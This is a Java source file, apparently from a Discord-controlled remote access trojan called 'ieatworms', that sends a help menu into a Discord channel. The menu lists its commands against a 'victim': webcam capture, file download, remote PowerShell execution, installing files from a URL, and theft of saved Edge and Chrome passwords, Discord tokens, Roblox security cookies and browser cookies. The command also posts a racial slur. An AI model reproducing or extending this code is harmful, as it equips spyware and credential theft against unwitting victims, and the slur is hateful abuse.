package me.vasler.command.impl;

import me.vasler.command.Command;
import me.vasler.utils.os.MacUtil;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

import java.awt.*;

public class HelpCommand
extends Command {
    public HelpCommand() {
        super(new String[]{"help", "commands", "h", "cmds"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        channel.sendMessage("Fuck you nigga").queue();
        EmbedBuilder eb = new EmbedBuilder();
        eb.setTitle("Help", null);
        eb.setColor(Color.BLUE);
        String string = "**The command prefix is -.**" + "\n";
        string += "-camera: *Takes a picture of the victim's camera.*" + "\n";
        string += "-download: *Downloads any file from the victim's computer. [Usage: -download (file directory)]*" + "\n";
        string += "-info: *Find the computer specifications for the victim's computer.*" + "\n";
        string += "-ip: *Gets the IPv4 address of the victim.*" + "\n";
        string += "-ss: *Takes a screenshot of what the victim sees on his computer.*" + "\n";
        string += "-runcmd: *Runs any command through powershell on the victim's computer. [Usage: -runcmd (COMMAND)]*" + "\n";
        string += "-install: *Installs any file through a URL connection on the victims computer. [Usage: -install (url download)]*" + "\n";
        string += "-edge: *Grabs the saved passwords from Microsoft Edge.*" + "\n";
        string += "-chrome: *Grabs the saved passwords from Google Chrome.*" + "\n";
        string += "-token: *Grabs the victim's discord token.*" + "\n";
        string += "-roblox: *Grabs the victim's ROBLOSECURITY cookie and the info related to his account.*" + "\n";
        string += "-cookie: *Grabs the victim's cookies from their browser.*" + "\n";
        eb.setDescription(string);
        eb.setFooter("ieatworms - Created by Valser and RailHack", "https://media.discordapp.net/attachments/1176729350398287912/1179982540384260167/OIP_1.png?ex=657bc360&is=65694e60&hm=7cc00a922bca808938bbb25e19e807621545bb2468823bb699ba2b78816ec385&=&format=webp&quality=lossless");
        channel.sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
    }
}

